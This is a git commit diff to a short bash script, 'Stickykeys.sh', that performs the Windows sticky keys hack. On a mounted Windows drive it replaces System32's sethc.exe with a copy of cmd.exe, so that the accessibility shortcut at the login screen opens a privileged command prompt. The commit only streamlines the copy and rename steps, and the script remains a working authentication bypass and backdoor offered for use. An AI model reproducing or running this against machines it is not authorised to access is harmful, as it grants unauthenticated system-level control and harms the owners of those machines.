e7f5d3a172fb0e646687d8633b919c0d6daa6643
Paul Benoit <benoitpaul6@gmail.com>
2016-07-30 13:21:58 -0400

    efficiency

--- Stickykeys.sh
+++ Stickykeys.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 #execute the windows sticky keys hack
 
-cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/cmdlol.exe"
 mv "/media/windows/Windows/System32/sethc.exe" "/media/windows/Windows/System32/sethcold.exe"
-mv "/media/windows/Windows/System32/cmdlol.exe" "/media/windows/Windows/System32/sethc.exe"
+cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/sethc.exe"
